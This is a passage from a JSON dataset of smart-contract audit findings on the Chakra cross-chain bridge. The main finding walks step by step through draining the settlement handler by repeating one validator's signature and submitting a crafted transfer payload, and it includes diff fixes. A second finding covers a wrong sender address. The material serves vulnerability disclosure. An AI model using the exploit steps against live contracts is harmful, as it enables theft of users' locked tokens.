Array<(felt252, felt252, bool)>\n) {\n    let mut pass_count = 0;\n    let mut i = 0;\n\n    // A set-like structure to keep track of processed public keys.\n+   let mut processed_pub_keys: LegacyMap<felt252, u8> = LegacyMap::new();\n\n    loop {\n        if i > signatures.len() - 1 {\n            break;\n        }\n\n        let (r, s, y) = *signatures.at(i);\n        let pub_key: felt252 = recover_public_key(message_hash, r, s, y).unwrap();\n-       if self.chakra_validators_pubkey.read(pub_key) > 0{\n+       if processed_pub_keys.get(pub_key) == 0 && self.chakra_validators_pubkey.read(pub_key) > 0 {\n            pass_count += 1;\n+           processed_pub_keys.append(pub_key);\n        }\n\n        i += 1;\n    }\n\n    assert(pass_count >= self.required_validators_num.read(), 'Not enough valid signatures');\n}\n```\n\n\n## Assessed type\n\nInvalid Validation\n", "poc_md": "## Proof of Concept\n\nFrom the `README`, we see that `validators` arent trusted roles, they simply have to perform their duties and in case they are misbehaving `MANAGER` can remove them. Its not expected they all to decide to perform a sybil attack.\nBut for this issue single validator can harm the entire protocol because signature verifiers dont check for duplicated validators and one valid signature is enough to pass the check:\n\n## Solidity:\n\n[SettlementSignatureVerifier.sol](https://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/SettlementSignatureVerifier.sol#L207)\n\n```solidity\nfunction verifyECDSA(\n    bytes32 msgHash,\n    bytes calldata signatures\n) internal view returns (bool) {\n    require(\n        signatures.length % 65 == 0,\n        \"Signature length must be a multiple of 65\"\n    );\n\n    uint256 len = signatures.length;\n    uint256 m = 0;\n    for (uint256 i = 0; i < len; i += 65) {\n        bytes memory sig = signatures[i:i + 65];\n        if (\n            validators[msgHash.recover(sig)] && ++m >= required_validators\n        ) {\n            return true;\n        }\n    }\n\n    return false;\n}\n```\n\nAs we can see nowhere do we check whether this sig is contained twice in the `signatures` argument.\n\nKnowing that a single validator can call `ChakraSettlement::receive_cross_chain_msg` with arbitrary arguments and drain all the `ChakraSettlementHandler` balances where he is an active validator.\n\nThe caller of the function should only give valid chains and handlers, the payload will also be valid so it can be decoded but the `amount` will be the entire balance (this is the max impact, but even 1 wei is considered steal because the caller has not burned or locked any tokens by first calling the `send_cross_chain_msg` function) of the handler.\n\nFurthermore, the entire handler can be blocked because of the missing duplicate signature check:\n\n1. **Single** validator can sign `message_hash` that has `ERC20TransferPayload` like this, without locking any tokens in the handler on the source chain:\n\n    ```solidity\n    ERC20TransferPayload memory payload = ERC20TransferPayload(\n        ERC20Method.Transfer,\n        AddressCast.to_uint256(msg.sender),\n        to,//his own address on the destination chain\n        AddressCast.to_uint256(token),\n        to_token,\n        //if SettlementMode: LockMint or MintBurn\n        (type(uint256).max - IERC20(token).totalSupply())\n        //if SettlementMode: LockUnlock or BurnUnlock\n        IERC20(token).balanceOf(address(from_handler))\n    );\n    ```\n\n2. Then he will call the `ChakraSettlement::receive_cross_chain_msg` on the destination and signature validation will pass because he passed his signature to the `signatures` argument enough times so the `signature_verifier.verify` returns **true** (again this happens due to the missing duplicate signatures check):\n\n    For example if the `required_validators` = 3, his `signature` bytes will look like this:\n\n    `[0xf86c0a8502540be400825208944.0xf86c0a8502540be400825208944.0xf86c0a8502540be400825208944.]`, where dots are the remaining bytes but I think you got it ;)\n\n    ```solidity\n    function verifyECDSA(\n        bytes32 msgHash,\n        bytes calldata signatures\n    ) internal view returns (bool) {\n        require(\n            signatures.length % 65 == 0,\n            \"Signature length must be a multiple of 65\"\n        );\n\n        uint256 len = signatures.length;\n        uint256 m = 0;\n        for (uint256 i = 0; i < len; i += 65) {\n            bytes memory sig = signatures[i:i + 65];\n            if (\n                validators[msgHash.recover(sig)] && ++m >= required_validators\n            ) {\n                return true;\n            }\n        }\n\n        return false;\n    }\n    ```\n\n3. `ChakraSettlementHandler::receive_cross_chain_msg` will be executed:\n\n    ```solidity\n    bool result = ISettlementHandler(to_handler).receive_cross_chain_msg(\n        txid,\n        from_chain,\n        from_address,\n        from_handler,\n        payload_type,\n        payload,\n        sign_type,\n        signatures\n    );\n    ```\n\n4. Malicious `ERC20TransferPayload` will be encoded and the handler will either mint to the attacker the amount which will make the `totalSupply` of the token = `uint256.max` if the mode is `mint` or the entire balance of the `ChakraSettlementHandler` stealing the locked tokens of the honest users.\n\n## Cairo:\n\nThe same issue applies to the `Cairo` code as well:\n\n[settlement.cairo](https://github.com/code-423n4/2024-08-chakra/blob/main/cairo/handler/src/settlement.cairo#L173C7-L173C8)\n\n```rust\nfn check_chakra_signatures(\n    self: @ContractState, message_hash: felt252, signatures: Array<(felt252, felt252, bool)>\n){\n    let mut pass_count = 0;\n    let mut i = 0;\n    loop {\n        if i > signatures.len()-1{\n            break;\n        }\n        let (r,s,y) = * signatures.at(i);\n\n        let pub_key: felt252 = recover_public_key(message_hash,r,s,y).unwrap();\n        if self.chakra_validators_pubkey.read(pub_key) > 0{\n            pass_count += 1;\n        }\n        i += 1;\n    };\n    assert(pass_count >= self.required_validators_num.read(), 'Not enough validate signatures');\n}\n```\n\nHere, `settlement::receive_cross_chain_msg` also can be called directly from a single validator and bypass all the checks, stealing the entire balance of the handler.\n\nThe caller of the functions should only give valid chains and handlers, the payload will also be valid so it can be decoded but the `amount` will be the entire balance (this is the max impact, even 1 wei is considered steal because the caller has not burned or locked any tokens by first calling the `send_cross_chain_msg` function) of the handler.\n\n> In case both issues are separated because they happen in different places we split this one into two, covering both languages, so it is to be accepted by both.\n>\n\n> ***NOTE**: Keep in mind that the issue shows that any validator can drain the entire protocol due to a missing duplicate signatures (used) check that allows him to do anything with only 1 signed message. The problem is not only that validators are not trusted, when the problem is fixed as below, even if a validator decides to do something like that, he can't achieve it, that's why `required_validators` is defined at all to protect the protocol from situations like this.*\n>\n\nIn the end this single validator doesnt lose anything, nowhere in the `README` it is mentioned that they are trusted, or any token stake is required from them, the only thing that can lose is their rights to continue signing transactions. On the other hand, they will receive the entire token supply or entire locked token balance.\n", "fix_status_md": null, "other_md": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/SettlementSignatureVerifier.sol#L193-L214\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/cairo/handler/src/settlement.cairo#L173-L190\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\n\nManual Review\n", "full_markdown_body": "https://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/SettlementSignatureVerifier.sol#L193-L214\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/cairo/handler/src/settlement.cairo#L173-L190\n\n\n# Vulnerability details\n\n## Impact\n\n`SettlementSignatureVerifier::verifyECDSA` and `settlement::check_chakra_signatures` lack checks for duplicate validators and allow passing the threshold with a single valid signature.\n\n## Proof of Concept\n\nFrom the `README`, we see that `validators` arent trusted roles, they simply have to perform their duties and in case they are misbehaving `MANAGER` can remove them. Its not expected they all to decide to perform a sybil attack.\nBut for this issue single validator can harm the entire protocol because signature verifiers dont check for duplicated validators and one valid signature is enough to pass the check:\n\n## Solidity:\n\n[SettlementSignatureVerifier.sol](https://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/SettlementSignatureVerifier.sol#L207)\n\n```solidity\nfunction verifyECDSA(\n    bytes32 msgHash,\n    bytes calldata signatures\n) internal view returns (bool) {\n    require(\n        signatures.length % 65 == 0,\n        \"Signature length must be a multiple of 65\"\n    );\n\n    uint256 len = signatures.length;\n    uint256 m = 0;\n    for (uint256 i = 0; i < len; i += 65) {\n        bytes memory sig = signatures[i:i + 65];\n        if (\n            validators[msgHash.recover(sig)] && ++m >= required_validators\n        ) {\n            return true;\n        }\n    }\n\n    return false;\n}\n```\n\nAs we can see nowhere do we check whether this sig is contained twice in the `signatures` argument.\n\nKnowing that a single validator can call `ChakraSettlement::receive_cross_chain_msg` with arbitrary arguments and drain all the `ChakraSettlementHandler` balances where he is an active validator.\n\nThe caller of the function should only give valid chains and handlers, the payload will also be valid so it can be decoded but the `amount` will be the entire balance (this is the max impact, but even 1 wei is considered steal because the caller has not burned or locked any tokens by first calling the `send_cross_chain_msg` function) of the handler.\n\nFurthermore, the entire handler can be blocked because of the missing duplicate signature check:\n\n1. **Single** validator can sign `message_hash` that has `ERC20TransferPayload` like this, without locking any tokens in the handler on the source chain:\n\n    ```solidity\n    ERC20TransferPayload memory payload = ERC20TransferPayload(\n        ERC20Method.Transfer,\n        AddressCast.to_uint256(msg.sender),\n        to,//his own address on the destination chain\n        AddressCast.to_uint256(token),\n        to_token,\n        //if SettlementMode: LockMint or MintBurn\n        (type(uint256).max - IERC20(token).totalSupply())\n        //if SettlementMode: LockUnlock or BurnUnlock\n        IERC20(token).balanceOf(address(from_handler))\n    );\n    ```\n\n2. Then he will call the `ChakraSettlement::receive_cross_chain_msg` on the destination and signature validation will pass because he passed his signature to the `signatures` argument enough times so the `signature_verifier.verify` returns **true** (again this happens due to the missing duplicate signatures check):\n\n    For example if the `required_validators` = 3, his `signature` bytes will look like this:\n\n    `[0xf86c0a8502540be400825208944.0xf86c0a8502540be400825208944.0xf86c0a8502540be400825208944.]`, where dots are the remaining bytes but I think you got it ;)\n\n    ```solidity\n    function verifyECDSA(\n        bytes32 msgHash,\n        bytes calldata signatures\n    ) internal view returns (bool) {\n        require(\n            signatures.length % 65 == 0,\n            \"Signature length must be a multiple of 65\"\n        );\n\n        uint256 len = signatures.length;\n        uint256 m = 0;\n        for (uint256 i = 0; i < len; i += 65) {\n            bytes memory sig = signatures[i:i + 65];\n            if (\n                validators[msgHash.recover(sig)] && ++m >= required_validators\n            ) {\n                return true;\n            }\n        }\n\n        return false;\n    }\n    ```\n\n3. `ChakraSettlementHandler::receive_cross_chain_msg` will be executed:\n\n    ```solidity\n    bool result = ISettlementHandler(to_handler).receive_cross_chain_msg(\n        txid,\n        from_chain,\n        from_address,\n        from_handler,\n        payload_type,\n        payload,\n        sign_type,\n        signatures\n    );\n    ```\n\n4. Malicious `ERC20TransferPayload` will be encoded and the handler will either mint to the attacker the amount which will make the `totalSupply` of the token = `uint256.max` if the mode is `mint` or the entire balance of the `ChakraSettlementHandler` stealing the locked tokens of the honest users.\n\n## Cairo:\n\nThe same issue applies to the `Cairo` code as well:\n\n[settlement.cairo](https://github.com/code-423n4/2024-08-chakra/blob/main/cairo/handler/src/settlement.cairo#L173C7-L173C8)\n\n```rust\nfn check_chakra_signatures(\n    self: @ContractState, message_hash: felt252, signatures: Array<(felt252, felt252, bool)>\n){\n    let mut pass_count = 0;\n    let mut i = 0;\n    loop {\n        if i > signatures.len()-1{\n            break;\n        }\n        let (r,s,y) = * signatures.at(i);\n\n        let pub_key: felt252 = recover_public_key(message_hash,r,s,y).unwrap();\n        if self.chakra_validators_pubkey.read(pub_key) > 0{\n            pass_count += 1;\n        }\n        i += 1;\n    };\n    assert(pass_count >= self.required_validators_num.read(), 'Not enough validate signatures');\n}\n```\n\nHere, `settlement::receive_cross_chain_msg` also can be called directly from a single validator and bypass all the checks, stealing the entire balance of the handler.\n\nThe caller of the functions should only give valid chains and handlers, the payload will also be valid so it can be decoded but the `amount` will be the entire balance (this is the max impact, even 1 wei is considered steal because the caller has not burned or locked any tokens by first calling the `send_cross_chain_msg` function) of the handler.\n\n> In case both issues are separated because they happen in different places we split this one into two, covering both languages, so it is to be accepted by both.\n>\n\n> ***NOTE**: Keep in mind that the issue shows that any validator can drain the entire protocol due to a missing duplicate signatures (used) check that allows him to do anything with only 1 signed message. The problem is not only that validators are not trusted, when the problem is fixed as below, even if a validator decides to do something like that, he can't achieve it, that's why `required_validators` is defined at all to protect the protocol from situations like this.*\n>\n\nIn the end this single validator doesnt lose anything, nowhere in the `README` it is mentioned that they are trusted, or any token stake is required from them, the only thing that can lose is their rights to continue signing transactions. On the other hand, they will receive the entire token supply or entire locked token balance.\n\n## Tools Used\n\nManual Review\n\n## Recommended Mitigation Steps\n\nFor Solidity:\n\n```diff\n+ mapping (bytes32 msgHash => mapping(address validator => bool usedSig)) public isSignatureUsed;\n\n  function verifyECDSA(\n      bytes32 msgHash,\n      bytes calldata signatures\n  ) internal view returns (bool) {\n      require(\n          signatures.length % 65 == 0,\n          \"Signature length must be a multiple of 65\"\n      );\n\n      uint256 len = signatures.length;\n      uint256 m = 0;\n      for (uint256 i = 0; i < len; i += 65) {\n          bytes memory sig = signatures[i:i + 65];\n\n+         address validator = msgHash.recover(sig);\n          if (\n-             validators[msgHash.recover(sig)] && ++m >= required_validators\n+             !isSignatureUsed[msgHash][validator] && validators[validator]\n          ) {\n+             isSignatureUsed[msgHash][validator] = true;\n+             m++;\n          }\n\n+         if (m >= required_validators) {\n+             return true;\n+         }\n      }\n\n      return false;\n  }\n```\n\nFor Cairo:\n\n```diff\nfn check_chakra_signatures(\n    self: @ContractState,\n    message_hash: felt252,\n    signatures: Array<(felt252, felt252, bool)>\n) {\n    let mut pass_count = 0;\n    let mut i = 0;\n\n    // A set-like structure to keep track of processed public keys.\n+   let mut processed_pub_keys: LegacyMap<felt252, u8> = LegacyMap::new();\n\n    loop {\n        if i > signatures.len() - 1 {\n            break;\n        }\n\n        let (r, s, y) = *signatures.at(i);\n        let pub_key: felt252 = recover_public_key(message_hash, r, s, y).unwrap();\n-       if self.chakra_validators_pubkey.read(pub_key) > 0{\n+       if processed_pub_keys.get(pub_key) == 0 && self.chakra_validators_pubkey.read(pub_key) > 0 {\n            pass_count += 1;\n+           processed_pub_keys.append(pub_key);\n        }\n\n        i += 1;\n    }\n\n    assert(pass_count >= self.required_validators_num.read(), 'Not enough valid signatures');\n}\n```\n\n\n## Assessed type\n\nInvalid Validation\n", "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/SettlementSignatureVerifier.sol#L193-L214\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/cairo/handler/src/settlement.cairo#L173-L190\n\n\n# Vulnerability details\n\n## Impact\n\n`SettlementSignatureVerifier::verifyECDSA` and `settlement::check_chakra_signatures` lack checks for duplicate validators and allow passing the threshold with a single valid signature.\n\n## Proof of Concept\n\nFrom the `README`, we see that `validators` arent trusted roles, they simply have to perform their duties and in case they are misbehaving `MANAGER` can remove them. Its not expected they all to decide to perform a sybil attack.\nBut for this issue single validator can harm the entire protocol because signature verifiers dont check for duplicated validators and one valid signature is enough to pass the check:\n\n## Solidity:\n\n[SettlementSignatureVerifier.sol](https://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/SettlementSignatureVerifier.sol#L207)\n\n```solidity\nfunction verifyECDSA(\n    bytes32 msgHash,\n    bytes calldata signatures\n) internal view returns (bool) {\n    require(\n        signatures.length % 65 == 0,\n        \"Signature length must be a multiple of 65\"\n    );\n\n    uint256 len = signatures.length;\n    uint256 m = 0;\n    for (uint256 i = 0; i < len; i += 65) {\n        bytes memory sig = signatures[i:i + 65];\n        if (\n            validators[msgHash.recover(sig)] && ++m >= required_validators\n        ) {\n            return true;\n        }\n    }\n\n    return false;\n}\n```\n\nAs we can see nowhere do we check whether this sig is contained twice in the `signatures` argument.\n\nKnowing that a single validator can call `ChakraSettlement::receive_cross_chain_msg` with arbitrary arguments and drain all the `ChakraSettlementHandler` balances where he is an active validator.\n\nThe caller of the function should only give valid chains and handlers, the payload will also be valid so it can be decoded but the `amount` will be the entire balance (this is the max impact, but even 1 wei is considered steal because the caller has not burned or locked any tokens by first calling the `send_cross_chain_msg` function) of the handler.\n\nFurthermore, the entire handler can be blocked because of the missing duplicate signature check:\n\n1. **Single** validator can sign `message_hash` that has `ERC20TransferPayload` like this, without locking any tokens in the handler on the source chain:\n    \n    ```solidity\n    ERC20TransferPayload memory payload = ERC20TransferPayload(\n        ERC20Method.Transfer,\n        AddressCast.to_uint256(msg.sender),\n        to,//his own address on the destination chain\n        AddressCast.to_uint256(token),\n        to_token,\n        //if SettlementMode: LockMint or MintBurn\n        (type(uint256).max - IERC20(token).totalSupply())\n        //if SettlementMode: LockUnlock or BurnUnlock\n        IERC20(token).balanceOf(address(from_handler))\n    );\n    ```\n    \n2. Then he will call the `ChakraSettlement::receive_cross_chain_msg` on the destination and signature validation will pass because he passed his signature to the `signatures` argument enough times so the `signature_verifier.verify` returns **true** (again this happens due to the missing duplicate signatures check):\n    \n    For example if the `required_validators` = 3, his `signature` bytes will look like this:\n    \n    `[0xf86c0a8502540be400825208944.0xf86c0a8502540be400825208944.0xf86c0a8502540be400825208944.]`, where dots are the remaining bytes but I think you got it ;)\n    \n    ```solidity\n    function verifyECDSA(\n        bytes32 msgHash,\n        bytes calldata signatures\n    ) internal view returns (bool) {\n        require(\n            signatures.length % 65 == 0,\n            \"Signature length must be a multiple of 65\"\n        );\n    \n        uint256 len = signatures.length;\n        uint256 m = 0;\n        for (uint256 i = 0; i < len; i += 65) {\n            bytes memory sig = signatures[i:i + 65];\n            if (\n                validators[msgHash.recover(sig)] && ++m >= required_validators\n            ) {\n                return true;\n            }\n        }\n    \n        return false;\n    }\n    ```\n    \n3. `ChakraSettlementHandler::receive_cross_chain_msg` will be executed:\n    \n    ```solidity\n    bool result = ISettlementHandler(to_handler).receive_cross_chain_msg(\n        txid,\n        from_chain,\n        from_address,\n        from_handler,\n        payload_type,\n        payload,\n        sign_type,\n        signatures\n    );\n    ```\n    \n4. Malicious `ERC20TransferPayload` will be encoded and the handler will either mint to the attacker the amount which will make the `totalSupply` of the token = `uint256.max` if the mode is `mint` or the entire balance of the `ChakraSettlementHandler` stealing the locked tokens of the honest users.\n\n## Cairo:\n\nThe same issue applies to the `Cairo` code as well:\n\n[settlement.cairo](https://github.com/code-423n4/2024-08-chakra/blob/main/cairo/handler/src/settlement.cairo#L173C7-L173C8)\n\n```rust\nfn check_chakra_signatures(\n    self: @ContractState, message_hash: felt252, signatures: Array<(felt252, felt252, bool)>\n){\n    let mut pass_count = 0;\n    let mut i = 0;\n    loop {\n        if i > signatures.len()-1{\n            break;\n        }\n        let (r,s,y) = * signatures.at(i);\n\n        let pub_key: felt252 = recover_public_key(message_hash,r,s,y).unwrap();\n        if self.chakra_validators_pubkey.read(pub_key) > 0{\n            pass_count += 1;\n        }\n        i += 1;\n    };\n    assert(pass_count >= self.required_validators_num.read(), 'Not enough validate signatures');\n}\n```\n\nHere, `settlement::receive_cross_chain_msg` also can be called directly from a single validator and bypass all the checks, stealing the entire balance of the handler.\n\nThe caller of the functions should only give valid chains and handlers, the payload will also be valid so it can be decoded but the `amount` will be the entire balance (this is the max impact, even 1 wei is considered steal because the caller has not burned or locked any tokens by first calling the `send_cross_chain_msg` function) of the handler.\n\n> In case both issues are separated because they happen in different places we split this one into two, covering both languages, so it is to be accepted by both.\n> \n\n> ***NOTE**: Keep in mind that the issue shows that any validator can drain the entire protocol due to a missing duplicate signatures (used) check that allows him to do anything with only 1 signed message. The problem is not only that validators are not trusted, when the problem is fixed as below, even if a validator decides to do something like that, he can't achieve it, that's why `required_validators` is defined at all to protect the protocol from situations like this.*\n> \n\nIn the end this single validator doesnt lose anything, nowhere in the `README` it is mentioned that they are trusted, or any token stake is required from them, the only thing that can lose is their rights to continue signing transactions. On the other hand, they will receive the entire token supply or entire locked token balance.\n\n## Tools Used\n\nManual Review\n\n## Recommended Mitigation Steps\n\nFor Solidity:\n\n```diff\n+ mapping (bytes32 msgHash => mapping(address validator => bool usedSig)) public isSignatureUsed;\n\n  function verifyECDSA(\n      bytes32 msgHash,\n      bytes calldata signatures\n  ) internal view returns (bool) {\n      require(\n          signatures.length % 65 == 0,\n          \"Signature length must be a multiple of 65\"\n      );\n\n      uint256 len = signatures.length;\n      uint256 m = 0;\n      for (uint256 i = 0; i < len; i += 65) {\n          bytes memory sig = signatures[i:i + 65];\n\n+         address validator = msgHash.recover(sig);\n          if (\n-             validators[msgHash.recover(sig)] && ++m >= required_validators\n+             !isSignatureUsed[msgHash][validator] && validators[validator]\n          ) {\n+             isSignatureUsed[msgHash][validator] = true;\n+             m++;\n          }\n\n+         if (m >= required_validators) {\n+             return true;\n+         }\n      }\n\n      return false;\n  }\n```\n\nFor Cairo:\n\n```diff\nfn check_chakra_signatures(\n    self: @ContractState, \n    message_hash: felt252, \n    signatures: Array<(felt252, felt252, bool)>\n) {\n    let mut pass_count = 0;\n    let mut i = 0;\n    \n    // A set-like structure to keep track of processed public keys.\n+   let mut processed_pub_keys: LegacyMap<felt252, u8> = LegacyMap::new();\n    \n    loop {\n        if i > signatures.len() - 1 {\n            break;\n        }\n        \n        let (r, s, y) = *signatures.at(i);\n        let pub_key: felt252 = recover_public_key(message_hash, r, s, y).unwrap();\n-       if self.chakra_validators_pubkey.read(pub_key) > 0{\n+       if processed_pub_keys.get(pub_key) == 0 && self.chakra_validators_pubkey.read(pub_key) > 0 {\n            pass_count += 1;\n+           processed_pub_keys.append(pub_key);\n        }\n        \n        i += 1;\n    }\n    \n    assert(pass_count >= self.required_validators_num.read(), 'Not enough valid signatures');\n}\n```\n\n\n## Assessed type\n\nInvalid Validation"}, "severity": "High", "difficulty": null, "type": "bug", "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/code-423n4/2024-08-chakra", "org": "code-423n4", "name": "2024-08-chakra", "commit": "abef77d95866f2fec93270491fc5abc9ab14f86d", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "github:code-423n4/2024-08-chakra-findings", "source_mtime": null, "report_extracted_at": "2025-11-19T10:34:16.759106+00:00", "report_extractor_version": "github-issues-0.1", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-19T10:34:16.773080+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "High", "Difficulty": null, "Type": "bug", "Finding ID": null, "Target": null, "Severity_normalized": "High"}}
{"schema_version": "0.1", "scvd_id": "SCVD-github:code-423n4/2024-08-chakra-findings-327", "doc_id": "github:code-423n4/2024-08-chakra-findings", "finding_index": 327, "page_start": null, "title": "inconsistency in sender address when creating cross chain messages on Starknet can lead to loss of funds", "short_summary": null, "description_md": null, "full_markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/handler/src/handler_erc20.cairo#L188\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/handler/src/handler_erc20.cairo#L222\n\n\n# Vulnerability details\n\n## Impact\n- Funds could get stuck in the `handler_erc20.cairo` contract.\n- Validators can evaluate transactions wrongly\n\n## Proof of Concept\nIn the `handler_erc20::cross_chain_erc20_settlement(...)` function, the `tx_id` is saved with the `CreatedCrossChainTx` struct which contain info about the transaction including the sender whose account the token was transferred from.\nHowever, on L188 the `from` value is supposed to be the caller's address but the `handler_erc20` address is used instead of the `get_caller_address()`.\nMoreso, the event that are being used by the validators uses `from: get_caller_address(),`.\n\n\n\n```rust\nFile: handler_erc20.cairo\n167:         fn cross_chain_erc20_settlement(ref self: ContractState, to_chain: felt252, to_handler: u256, to_token: u256, to: u256, amount: u256) -> felt252{\n168:             assert(self.support_handler.read((to_chain, to_handler)), 'not support handler');\n169:             let settlement = IChakraSettlementDispatcher {contract_address: self.settlement_address.read()};\n170:             let from_chain = settlement.chain_name();\n171:             let token = IERC20Dispatcher{contract_address: self.token_address.read()};\n172:             let token_burnable = IERC20MintDispatcher{contract_address: self.token_address.read()};\n173:             if self.mode.read() == SettlementMode::MintBurn{\n174:                 token.transfer_from(get_caller_address(), get_contract_address(), amount);\nSNIP        .......\n182:\n183:             let tx_id = LegacyHash::hash(get_tx_info().unbox().transaction_hash, self.msg_count.read());\n184:             let tx: CreatedCrossChainTx = CreatedCrossChainTx{\n185:                     tx_id: tx_id,\n186:                     from_chain: from_chain,\n187:                     to_chain: to_chain,\n188:     @>              from: get_contract_address(), // @audit 8) wrong address used for sender when creating cc tx SUGG: replace with get_caller_address()\n189:                     to: to,\n190:                     from_token: self.token_address.read(),\n191:                     to_token: to_token,\n192:                     amount: amount,\n193:                     tx_status: CrossChainTxStatus::PENDING\n194:                 };\n\nSNIP        .......\n\n219:             self.emit(\n220:                     CrossChainLocked{\n221:                         tx_id: tx_id,\n222:                         from: get_caller_address(),\n223:                         to: to,\n224:                         from_chain: get_tx_info().unbox().chain_id,\n225:                         to_chain: to_chain,\n226:    @>                   from_token: self.token_address.read(),\n227:                         to_token: to_token,\n228:                         amount: amount\n229:                     }\n230:                 );\n231:             return tx_id;\n232:         }\n\n\n```\n\nThe problem is that\n- since it is not clear from the audit README or the Docs how the validators would use the event, the event contains both the `tx_id` (formed with a wrong `from` value) and the correct `from` value, transactions could be processed erroneously\n- If the transactions are processed wrongly, then the funds could be stuck in the contract. Without a way to retrieve them and this is a loss to the user.\n\n\n## Tools Used\nManual review\n\n## Recommended Mitigation Steps\n\nModify the `handler_erc20::cross_chain_erc20_settlement(...)` function as shown below\n\n```rust\nFile: handler_erc20.cairo\n167:         fn cross_chain_erc20_settlement(ref self: ContractState, to_chain: felt252, to_handler: u256, to_token: u256, to: u256, amount: u256) -> felt252{\n168:             assert(self.support_handler.read((to_chain, to_handler)), 'not support handler');\n169:             let settlement = IChakraSettlementDispatcher {contract_address: self.settlement_address.read()};\n170:             let from_chain = settlement.chain_name();\n171:             let token = IERC20Dispatcher{contract_address: self.token_address.read()};\n172:             let token_burnable = IERC20MintDispatcher{contract_address: self.token_address.read()};\n173:             if self.mode.read() == SettlementMode::MintBurn{\n174:                 token.transfer_from(get_caller_address(), get_contract_address(), amount);\nSNIP        .......\n182:\n183:             let tx_id = LegacyHash::hash(get_tx_info().unbox().transaction_hash, self.msg_count.read());\n184:             let tx: CreatedCrossChainTx = CreatedCrossChainTx{\n185:                     tx_id: tx_id,\n186:                     from_chain: from_chain,\n187:                     to_chain: to_chain,\n-188:                    from: get_contract_address(),\n+188:                    from: get_caller_address(),\n189:                     to: to,\n190:                     from_token: self.token_address.read(),\n191:                     to_token: to_token,\n192:                     amount: amount,\n193:                     tx_status: CrossChainTxStatus::PENDING\n194:                 };\n\nSNIP        .......\n\n219:             self.emit(\n220:                     CrossChainLocked{\n221:                         tx_id: tx_id,\n222:                         from: get_caller_address(),\n223:                         to: to,\n224:                         from_chain: get_tx_info().unbox().chain_id,\n225:                         to_chain: to_chain,\n226:                         from_token: self.token_address.read(),\n227:                         to_token: to_token,\n228:                         amount: amount\n229:                     }\n230:                 );\n231:             return tx_id;\n232:         }\n\n\n```\n\n\n## Assessed type\n\nInvalid Validation\n", "sections": {"description_md": null, "impact_md": "## Impact\n- Funds could get stuck in the `handler_erc20.cairo` contract.\n- Validators can evaluate transactions wrongly\n", "recommendation_md": "## Recommended Mitigation Steps\n\nModify the `handler_erc20::cross_chain_erc20_settlement(...)` function as shown below\n\n```rust\nFile: handler_erc20.cairo\n167:         fn cross_chain_erc20_settlement(ref self: ContractState, to_chain: felt252, to_handler: u256, to_token: u256, to: u256, amount: u256) -> felt252{\n168:             assert(self.support_handler.read((to_chain, to_handler)), 'not support handler');\n169:             let settlement = IChakraSettlementDispatcher {contract_address: self.settlement_address.read()};\n170:             let from_chain = settlement.chain_name();\n171:             let token = IERC20Dispatcher{contract_address: self.token_address.read()};\n172:             let token_burnable = IERC20MintDispatcher{contract_address: self.token_address.read()};\n173:             if self.mode.read() == SettlementMode::MintBurn{\n174:                 token.transfer_from(get_caller_address(), get_contract_address(), amount);\nSNIP        .......\n182:\n183:             let tx_id = LegacyHash::hash(get_tx_info().unbox().transaction_hash, self.msg_count.read());\n184:             let tx: CreatedCrossChainTx = CreatedCrossChainTx{\n185:                     tx_id: tx_id,\n186:                     from_chain: from_chain,\n187:                     to_chain: to_chain,\n-188:                    from: get_contract_address(),\n+188:                    from: get_caller_address(),\n189:                     to: to,\n190:                     from_token: self.token_address.read(),\n191:                     to_token: to_token,\n192:                     amount: amount,\n193:                     tx_status: CrossChainTxStatus::PENDING\n194:                 };\n\nSNIP        .......\n\n219:             self.emit(\n220:                     CrossChainLocked{\n221:                         tx_id: tx_id,\n222:                         from: get_caller_address(),\n223:                         to: to,\n224:                         from_chain: get_tx_info().unbox().chain_id,\n225:                         to_chain: to_chain,\n226:                         from_token: self.token_address.read(),\n227:                         to_token: to_token,\n228:                         amount: amount\n229:                     }\n230:                 );\n231:             return tx_id;\n232:         }\n\n\n```\n\n\n## Assessed type\n\nInvalid Validation\n", "poc_md": "## Proof of Concept\nIn the `handler_erc20::cross_chain_erc20_settlement(...)` function, the `tx_id` is saved with the `CreatedCrossChainTx` struct which contain info about the transaction including the sender whose account the token was transferred from.\nHowever, on L188 the `from` value is supposed to be the caller's address but the `handler_erc20` address is used instead of the `get_caller_address()`.\nMoreso, the event that are being used by the validators uses `from: get_caller_address(),`.\n\n\n\n```rust\nFile: handler_erc20.cairo\n167:         fn cross_chain_erc20_settlement(ref self: ContractState, to_chain: felt252, to_handler: u256, to_token: u256, to: u256, amount: u256) -> felt252{\n168:             assert(self.support_handler.read((to_chain, to_handler)), 'not support handler');\n169:             let settlement = IChakraSettlementDispatcher {contract_address: self.settlement_address.read()};\n170:             let from_chain = settlement.chain_name();\n171:             let token = IERC20Dispatcher{contract_address: self.token_address.read()};\n172:             let token_burnable = IERC20MintDispatcher{contract_address: self.token_address.read()};\n173:             if self.mode.read() == SettlementMode::MintBurn{\n174:                 token.transfer_from(get_caller_address(), get_contract_address(), amount);\nSNIP        .......\n182:\n183:             let tx_id = LegacyHash::hash(get_tx_info().unbox().transaction_hash, 